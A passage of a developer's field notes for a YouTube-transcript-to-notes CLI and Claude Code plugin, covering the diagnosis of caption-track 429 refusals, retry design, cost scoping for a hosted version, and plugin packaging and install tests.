> implementer. A brief is as load-bearing as the code it produces.

### Rate limiting is now a first-class failure mode

> **Corrected by §25.** This section reads the 429 as a consequence of request volume.
> It was not: the refusal is attached to the caption *track* being asked for, and the
> request count was a coincidence. The observations below are as recorded; the cause
> named in them is wrong.

Triage costs one metadata request per candidate (10 for `--last 10`), and every processed
video costs more. `--sub-langs "en.*"` matches both `en` and `en-orig`, so **each video
spends two subtitle requests where one would do**. After roughly fifteen requests YouTube
returned 429 for caption downloads and kept returning it for at least twenty minutes,
blocking both picks.

Follow-ups, all three done the same day — see §24:

- narrow `--sub-langs` to a single track, with a fallback
- back off and retry on 429 instead of failing the run
- have `sla queue` report caption availability — metadata already carries `_has_auto_en` —
  rather than only an estimated word count

### Triage against reality

The `~words` column is duration × ~150 wpm. It cannot know whether captions are fetchable
at all: for `_LCeJZFIsd4` it promised ~4,722 words where the real answer was "blocked". An
estimate presented beside hard facts reads as one, so it belongs in the table's own
labelling, not in a footnote.

---

## 24. Field notes: spending fewer requests, and surviving the ones refused (2026-09-24)

The three follow-ups from §23, built and verified the same day.

### One track, chosen from the names rather than matched by a pattern

`--sub-langs "en.*"` is a regex, and yt-dlp anchors it — so it matched `en` *and*
`en-orig` and downloaded both. Two subtitle requests per video, one of them redundant,
in the exact budget that ran out.

Fixing it needs the track *names*, which the metadata call already knows and was
throwing away. `_fetch_metadata` now records `_en_manual` and `_en_auto` and derives the
old booleans from them, so availability and selection come from one fact rather than two.

The order is the choice: a track named `<lang>-orig` is the video's own language rather
than a machine translation of it, so it leads, then exact `en`, then the rest. Only the
first is requested; the others are the fallback if it yields nothing.

| Metadata | Requests |
|---|---|
| `{en, en-orig}` | 1 (`en-orig`) |
| written before track names existed | 1 (`en`), falling back to the old `en.*` |

A cache entry from before this change still carries only the booleans. Treating that as a
miss would re-fetch every video's metadata — a request storm inside the fix for a request
limit — so the legacy path asks for `en` alone and keeps `en.*` as its fallback.

### Retrying is about what the error says, not what the exit code says

Backoff lives in `_run`, because the metadata call needs it as much as the caption call:
triage spends one request per candidate before anything is read. 3 attempts, waiting 5s
then 20s, both configurable.

Two things decide when it fires:

- **Only yt-dlp's `ERROR` lines count.** yt-dlp retries internally and narrates it; a
  `429` it recovered from is not a reason to run the whole command again.
- **The exit code is not the signal.** A rate-limited subtitle download prints `ERROR`
  and exits 0 (§23), so the retry reads stderr for the same reason the caller does.

Everything that is not a 429 stays final. Asking again for a video that does not exist
spends the budget that made this fail.

The same reasoning ends the track fallback early: a 429 refuses the *video*, not the
track, so trying the next one only buys a second refusal.

### Verified live, and the honest limit of it

Re-running the blocked `_LCeJZFIsd4` while still rate-limited: exactly **one** caption
request, three attempts, 43s wall clock — the 25s of backoff plus the calls — then a
failure quoting yt-dlp, and **no cache entry written**. The fix works; the block outlasts
it.

> Backoff rides out a burst. It cannot outwait this one, and pretending otherwise would
> just be a slower failure. What actually protects a channel run is spending fewer
> requests — which is what the first change does — and stopping cleanly when refused,
> which is what the second one does.

The reason backoff could not help turned out to be nothing to do with waiting: §25.

`/learn-from` is told to stop on a 429 rather than work through the remaining picks:
every attempt extends the block, and nothing was recorded, so the picks are offered again
unchanged.

### `unknown` is an answer, and an estimate is not a measurement

`sla queue` now carries a `captions` column, free — the flags were already fetched and
discarded. Three of its four values were easy; the fourth is the point.

| Value | Means |
|---|---|
| `manual` / `auto` | YouTube lists an English track |
| `none` | it lists none — there is nothing to read |
| `unknown` | the metadata predates the check |

`unknown` exists so that "not asked" is never rendered as "none". That is §23's rule
(a failure must never look like an absence) applied to a *missing field* rather than a
missing download, and it is one `in` check away from getting it wrong.

Two consequences follow:

- **A video with no captions ranks last**, whatever its title suggests. A pick is an
  instruction to read a transcript, and that one has none to read.
- **Its `~words` reads `—`, not `0`.** The estimate had promised ~4,722 words for a video
  with nothing fetchable. Where there is nothing to estimate, the column says nothing —
  and the header line now states that `~words` is duration × 150 wpm and that a listed
  caption track can still fail to download.

`unknown` keeps its estimate and its rank: the benefit of the doubt belongs to the state
that means "we did not ask".

### What would actually help next

Neither is needed for a run with the owner present; both matter for M6, where nobody is
watching the run trip the limit.

- **Pace the requests.** Volume is one lever and spacing is the other. Triage fires ten
  metadata calls back to back; a small delay between them costs seconds and may be what
  keeps a run under the threshold.
- **Remember being refused.** A 429 is currently forgotten the moment the process exits,
  so the next run walks straight back into it. A recorded "refused at T" would let a
  later run — or a scheduled one — wait rather than spend requests discovering the same
  block. It must expire, and it must never be confused with "this video has no captions".

### Two bounds a review asked for, and one it was right about

- **The wait is capped at 120s per retry.** `ytdlp_attempts` is the owner's to set and
  `4**` grows fast: eight attempts at the default base would have parked a run for
  nearly six hours.
- **`{}` from `_fetch_captions` now means "metadata said there are none", never
  "metadata did not say".** A cache entry predating the caption flags cannot tell those
  apart, and `{}` would have been cached as the former — §23's defect one layer earlier.
  It raises and says to re-fetch. No entry that old survives locally; the point is that
  the reachable-today version of this bug is the one that shipped last time.

The retry reads an `ERROR` line as "the call failed", which is what makes the exit-0
case detectable at all. Where yt-dlp is asked for several things at once it can refuse
one and deliver another, and a retry then repeats work that succeeded. Only the legacy
`en.*` fallback asks for more than one thing, and it costs a request rather than a wrong
answer, so the simpler rule stands — written down rather than left implicit.

### How long the refusal actually lasts

§23 recorded "at least twenty minutes" because that is how long the first run was
watched for. Four checks after the fix, one request each, say it is far longer:

| Time | Since the run that triggered it | Result |
|---|---|---|
| 01:07 | ~25 min | refused (3 attempts, 43s) |
| 01:24 | ~40 min | refused |
| 03:52 | ~3 h | refused |

A sixth check the next day, 45 hours in, was refused too. The conclusion drawn here —
that this was a per-address penalty lasting hours, and that "a channel run refused today
may stay refused for the rest of the day" — **was wrong**, and §25 says what was actually
happening. Every one of those six checks asked for the same caption track, which is the
variable none of them varied.

The measurements stand; the inference from them did not. Worth keeping as a record of how
convincing a sequence of consistent observations can be when they all share a hidden
constant.

---

## 25. Field notes: the rate limit that was not one (2026-09-25)

Two days of `HTTP 429` on caption downloads, six checks, one wrong conclusion. The
refusal is attached to the **caption track**, not to the machine, the video, or the
request count.

### What the evidence actually was

A seventh check split the question up instead of repeating it, one request per answer:

| Request | Result |
|---|---|
| metadata for `nglqTHwuZ-8` | OK |
| its **manual** `en` subtitles | OK, 225 events |
| its **auto** `en-orig` | OK, 1,232 events |
| its **auto** `en` | `HTTP 429` |
| `_LCeJZFIsd4` auto `en` | `HTTP 429` |
| `_LCeJZFIsd4` auto `en-orig` | OK, **5,915 words** |
| `EoNH3Tn8wYE` auto `en-orig` | OK, **5,337 words**, one request, 8.8s |

Same machine, same minutes. `en-orig` is the video's own language, fetched directly.
`en` on an English video is that same speech served through YouTube's translation path —
a dearer request, and one it refuses outright for an anonymous client. The status code
says "too many requests"; the behaviour is "not this track, ever".

### Why six consistent observations pointed the wrong way

Every probe re-ran the same failing call. `_LCeJZFIsd4`'s cached metadata predated the
track names, so it took the legacy path, which asked for `en` — the refused track — every
single time. Six identical refusals over 45 hours looked like a hardening penalty and were
one unvaried input.

> **Rule:** when a failure repeats identically, vary the request before concluding
> anything about the responder. A sequence of consistent observations that share a hidden
> constant is more convincing than a single one, and no more true. "It is still blocked"
> was a measurement; "we are blocked" was an inference, and the cheap test that separated
> them was available the whole time.

The original run in §23 fits this exactly. `--sub-langs "en.*"` matched `en` and `en-orig`;
yt-dlp asked for the refused one, aborted the whole subtitle step on its error, and never
reached the track that would have worked. So that run failed on its *first* attempt for
this reason, not after fifteen requests warmed up a limit.

### What changed in the code

§24's narrowing turns out to have been the fix rather than an optimisation — but only
because `-orig` leads, which was argued there on translation-quality grounds. It was right
for a better reason than the one given.

Three things the disproven model had made wrong:

- **A refused track no longer ends the attempt.** `_fetch_captions` used to break out of
  the loop on a 429, reasoning that the refusal was about the video. It is about the
  track, so it now tries the next one. This is the change that unblocks both videos.
- **The fallback loop was dead code.** `_download_track` reported failure by returning
  `None`, but a non-zero exit raised from `_run` first — and this 429 exits 1. No fallback
  could ever have run. `_run` grew a `check` parameter; the caption path decides for
  itself.
- **The legacy guess asked for the worst track first.** `("en", "en.*")` led with the
  refused track and then re-requested it inside a pattern. Auto captions now guess
  `("en-orig", "en")`, human subtitles `("en",)`, and `en.*` is gone: matching two tracks
  in one request is what §23 was.

Every failure in `_download_track` is now treated as being about that track, so a video
that is genuinely gone costs one wasted request per remaining track. That is cheaper than
telling the two apart by parsing yt-dlp's wording, and much cheaper than being wrong about
it twice.

### What this says about backoff

The retry from §24 never helped here and never could have: it re-asked a question with a
permanent answer, three times, 25s apart. It stays, because a genuine volume limit is
still plausible and the cost is bounded — but the thing that actually recovers a refused
caption download is **asking for a different track**, and that is now what happens first.

---

## 26. Field notes: a channel run, start to finish (2026-09-25)

`/learn-from @GregIsenberg`, the run §23 failed at. 10 videos triaged, the owner picked 3,
three notes and a digest written, nothing applied.

### What the fixed fetch actually costs

| Video | Metadata | Caption request | Result |
|---|---|---|---|
| `_LCeJZFIsd4` | cached, pre-track-names | 1 (`en-orig`, after a refresh) | 5,915 words |
| `EoNH3Tn8wYE` | cached, pre-track-names | 1 (`en-orig`, legacy guess) | 5,337 words |
| `84q4WA3kA8Q` | fresh from triage | 1 (`en-orig`, recorded) | 4,381 words, 10s |

Triage itself: one listing request plus metadata for the one video not already cached.
The whole three-note batch cost four network requests. §23's run spent about fifteen and
produced nothing.

The legacy guess earned its place: `EoNH3Tn8wYE` had metadata from before the track names
existed and still resolved in one request, because `("en-orig", "en")` leads with the
track that is actually served.

### The class guess was wrong, and the note says so

Triage called `84q4WA3kA8Q` **likely tooling** on the strength of tool words in the
description: `api`, `claude code`, `codex`, `mcp`. It is a solo episode of business ideas
with nothing installable in it, and its note is `conceptual` with `proposals: []`.

That is the §22 margin, and the shape of the misfire is now specific: **an episode that
talks about tools the whole way through without shipping one.** The keyword list cannot
tell "here is a repo" from "you could build this with Codex". Since the guess is labelled
as a guess and the owner picks, this cost nothing — but it is the second time the
heuristic has leaned the same way, and if it is ever tightened, this is the case to test
against.

Worth noting what the empty result looks like in the vault: *"Nothing here is worth
installing. No actions proposed."* Three videos, and the one with the most ideas in it
proposed nothing — I3 working exactly as intended rather than as an excuse.

### The two notes that had something to say about what is already installed

The Software Factory episode demonstrates a four-step workflow. Checked against the
inventory, three of its four steps are already covered here — `using-git-worktrees` is
its "isolate" almost exactly, `coding-standards` and `hexagonal-architecture` cover
"build", `requesting-code-review` covers "ship" — so the only proposal worth making was
for the fourth, the before/after proof artifact, which nothing installed produces.

This is the check M2 exists for, and it is the first time it changed the output rather
than confirming it. A note that had listed all four steps as things to adopt would have
been recommending, to an owner with 271 skills installed, three things they already own.

### A real drift, found by invoking the skill

Calling the skill loaded the **installed** copy from `~/.claude/skills/`, dated
2026-09-09, which predates M5: no Channels section, and an instruction to run
`sla brief @handle` — which the repo copy explicitly warns against, because it silently
takes only the newest video.

So `/learn-from @handle` in a fresh session would follow the pre-M5 procedure and process
one video without saying so. The repo copy was followed here instead.

> This is the drift check promised in §8 Rule 6, arriving as a live bug rather than a
> hypothetical. It also sharpens what the check is for: not "has the file changed" but
> "is the *instruction the agent will actually read* the current one". The dangerous
> direction is the one that happened — the live copy older than the repo's, silently
> teaching a superseded procedure.

Not fixed here. Syncing it activates a skill, and what activates is the owner's call
(§21, D7).

---

## 27. Scoping M7: what a hosted version actually costs (2026-10-01)

The ask is "make it live so people use it". This section is the honest scope of the hosted
option, measured rather than estimated, so the decision is against numbers.

### The seam is already the right shape

Synthesis is the only step a hosted version has to replace, and the architecture already
has a hole exactly where the model goes:

```
build_brief(doc, inventory) -> dict   ->   [ the agent ]   ->   parse_result(raw)
```

Everything downstream of `parse_result` — validation, risk re-derivation, rendering,
the ledger — is written and tested. **Hosting needs one new module**, not a rewrite:
brief in, validated synthesis JSON out. That is the good news, and it is real.

The bad news is that the new module's quality *is* the product, and what it replaces is
not a prompt. It is a 161-line skill, a system prompt, and whatever judgment the session
brings. The three notes written on 2026-09-25 each required reading a full transcript,
cross-checking it against the description, reading 271 installed skill descriptions, and
catching things a one-shot call will not: a `$200` / `$2,000` disagreement between
transcript and description, and a guest named three different ways across both. Expect a
single API call to be worse, and expect prompt iteration to be most of the work.

The three committed fixtures are an eval set for exactly this, which is the one piece of
groundwork already done.

### Measured cost per note

Briefs for all six processed videos, regenerated from cache. Tokens at ~4 chars/token:

| | words | brief, local | brief, hosted | inventory share |
|---|---|---|---|---|
| `UpE5yuhwXXc` | 3,486 | 73 KB | 24 KB | 68% |
| `9_SZFIW7tus` | 4,150 | 81 KB | 31 KB | 61% |
| `84q4WA3kA8Q` | 4,381 | 84 KB | 34 KB | 60% |
| `EoNH3Tn8wYE` | 5,337 | 87 KB | 37 KB | 57% |
| `_LCeJZFIsd4` | 5,915 | 92 KB | 42 KB | 54% |
| `gPPT4WpVRZ4` | 9,758 | 103 KB | 53 KB | 48% |

- **Hosted brief: ~6,000 to ~13,600 input tokens**, median ~9,600.
- **Output: ~3,800 tokens** for a full synthesis (measured from the one written by hand).
- Add reasoning tokens, which for work of this kind are not small.

So roughly **10k in, 4k out, plus thinking, per note**. At current mid-tier model prices
that lands near **$0.20 a note**; a top-tier model is several times that, a small model a
fraction. Check live pricing before trusting the figure — the token counts are the part
that is measured.

That makes 1,000 notes a month a ~$200 bill, and one visitor pasting a channel's hundred
videos a ~$20 visitor. Any hosted version needs a cap before it needs a frontend.

### The inventory is 57% of the brief, and it is the part worth keeping

The single most interesting number above. Dropping the inventory halves the brief — and
removes the check that made the Software Factory note good. That note proposes *one* thing
because three of the workflow's four steps were already installed (§26). Without an
inventory it would have recommended all four, to an owner who owns three.

This is the fork inside the hosted option, and it is not a detail:

| | Generic (no inventory) | Personalised |
|---|---|---|
| Cost | cacheable by video id, so popular videos are free after the first | full price per user per video |
| Quality | loses "you already have this" | keeps it |
| Privacy | nothing of the user's is sent | user uploads their installed-skills list |
| Artifact | shareable, publishable | belongs to one person |

Generic notes are cheap because they are impersonal, and impersonal is exactly what the
M2 inventory check exists to fix. **A hosted generic note is a demo of the local product,
not a replacement for it.**

### What hosting cannot do at all

The approval gate writes skills into *your* `~/.claude/skills` and scans before activating.
A web page cannot do either. Hosted output is therefore a note plus proposed skills as
downloadable files; applying them still needs the local install. §8, D7, §18, §21 and the
whole SkillSpector path do not cross the network.

So hosted is a funnel. That is a legitimate thing to build, as long as it is built as one.

### Operational risk, with evidence

Running yt-dlp server-side is the main ongoing cost, and this repo has unusually direct
evidence about it:

- YouTube refuses specific caption tracks indefinitely, and did so for 45 hours (§25).
- A burst of requests earned a 429 that looked permanent (§23).

One shared server address doing that for everyone is the worst case for both. Mitigations,
in order of value: **cache synthesis by video id** (the biggest lever, and only available
in the generic variant), fail loudly rather than silently (already true), and expect to
need request pacing and possibly egress rotation — which is maintenance, not a build step.
Separately, yt-dlp breaks whenever YouTube changes; a hosted service that does not track
its releases dies quietly, where a local user just upgrades.

### Content posture

Notes quote a creator's video substantially, by design — the evidence quotes are what make
a proposal checkable. Personal vault notes are one thing; a service that stores and serves
transcript-derived notes is another. Design constraints if this ships: keep notes private
to the requester, do not build a public index of them, and keep the source link and
attribution that the note template already carries.

### Effort, honestly

| Phase | Work | Size |
|---|---|---|
| A | synthesis-as-a-module, evaluated against the three fixtures | days to weeks, nearly all prompt iteration |
| B | paste-a-URL frontend, job queue, note storage, auth, rate limit, cache | about a week |
| C | yt-dlp failure handling, pacing, monitoring, cost caps | ongoing, never finished |

### Recommendation

**Do not host the pipeline yet.** The numbers say a hosted generic note costs real money
per visitor and throws away the half of the brief that made the notes worth keeping, while
still not being able to apply anything. The audience for this is Claude Code users, and
they can be reached by making the local plugin install in two commands — a day of work and
no running cost (§28 when it is done).

**Host the showcase instead.** Pre-rendered notes, no inference, no YouTube calls, nothing
to abuse, and it answers the only question a visitor actually has: *is the output any
good?* Nobody installs a CLI to find out.

If the hosted generator is built later, the cheapest shape worth shipping is: generic notes
cached by video id forever, a mid-tier model, a hard per-user daily cap, developer sign-in
to filter bots, and copy that says plainly it is a preview of what the plugin does on your
own machine.

---

## 28. Field notes: making it an installable plugin, and testing that claim (2026-10-01)

### The manifest was never valid

`claude plugin validate .` on the repo as it stood:

```
✘ author: Invalid input: expected object, received string
```

`.claude-plugin/plugin.json` has shipped since M0 with `"author": "Soham-1827"` where an
object was required, and there was no `marketplace.json` at all. **This has never been
installable as a plugin.** The README's `cp -r skills/... ~/.claude/skills/` was not a
convenience alternative to installing it properly — it was the only thing that worked, and
it is what caused the drift in §26.

Both manifests now validate under `--strict`, as do the `skills/` and `commands/`
directories as components.

### Verified by installing it, not by reading it

`claude plugin marketplace add <path>` takes a local path, so the whole install was
exercised before anything was pushed:

```
✔ Successfully added marketplace: self-learning-agent
✔ Successfully installed plugin: self-learning-agent@self-learning-agent (user)
```

`claude plugin details` then reports what a user actually pays for it:

| Component | always-on | on-invoke |
|---|---|---|
| `learn-from-source` | ~100 tok | ~2.4k tok |
| `learn-from` | ~40 tok | ~220 tok |
| **total always-on** | **~142 tok** | |

142 tokens added to every session is a cost worth knowing and small enough not to argue
about. Note that both the skill and the command register as *skills* — a slash command is
an invocable skill, so the inventory lists two.

### Clean-room test of the CLI

The plugin cannot install a Python package, so the CLI is a separate install and was tested
the way a stranger gets it: a copy of the tree with no `.git` or `.venv`, a fresh
interpreter, and a **non-editable** install, which is the only kind that catches packaging
bugs.

| Checked | Result |
|---|---|
| `uv pip install .` (non-editable), console script | `sla` present and runs |
| first run with no config at all | sensible defaults, no crash |
| exit codes | `1` runtime error, `2` usage error, `0` success |
| config.json honoured | vault redirected to the sandbox |
| `sla brief` offline from a copied cache | 5,915 words, 10 chapters, 9 links |
| `sla note` | note rendered into the sandbox vault |
| stored proposals | `id, kind, title, rationale, action` — **no risk field** |
| `uv tool install` | one command, working `sla`, left the dev symlink alone |

The missing risk field is deliberate and worth stating: risk is re-derived by `sla apply`
every time, never read back from disk, so editing the stored file cannot talk the gate into
a lower tier.

### The scan degrades in three honest states

All three observed live on the clean install, against the same two proposals:

| Environment | Skill proposal | What it says |
|---|---|---|
| no SkillSpector on PATH | **BLOCKED** | "refusing to activate unscanned" |
| SkillSpector, no model credentials | needs confirmation | `static-only (LLM requested but unavailable)` + "treat the score as weak evidence" |
| SkillSpector + provider | needs confirmation | `static + semantic · 0 finding(s)` |

The middle row is the one that matters for onboarding, and it is better than §27 assumed:
a user without model credentials still gets a static scan that labels itself weak, rather
than a hard stop or a false clean bill of health. The package proposal stayed at
`confirm [medium]` in all three, correctly — `SCAN_CAN_BLOCK == {"skill"}` (§18).

Also recorded: SkillSpector supports `anthropic` and `ollama` among its providers, so the
README's OpenAI key was never necessary. `ollama` needs no key at all.

### The suite was not testing what gets published

`tests/conftest.py` does `sys.path.insert(0, .../src)`, so every run — including CI, which
installs with `-e .` — imports from the source tree. **A packaging error would be invisible
to all 315 tests.**

Run instead from a directory with no `src/` on disk, against the installed package:

- Python 3.12, from `site-packages`: **315 passed**
- Python 3.10 (the floor), from `site-packages`: **315 passed**

Worth adding to CI as a second job rather than changing `conftest.py`, since the src-path
insert is what makes the dev loop work.

### The blocker this uncovered

`uv tool install git+https://github.com/...` works mechanically. What it installs today
does not: the published `main` is **six commits behind**, and the version on GitHub has
zero occurrences of `_en_auto` — it is the pre-§25 code that asks for the caption track
YouTube refuses.

> Anyone who installs from this repository right now gets a tool that cannot fetch a
> transcript. Every install instruction in this README is correct and every one of them
> currently delivers broken software. Pushing is the launch.
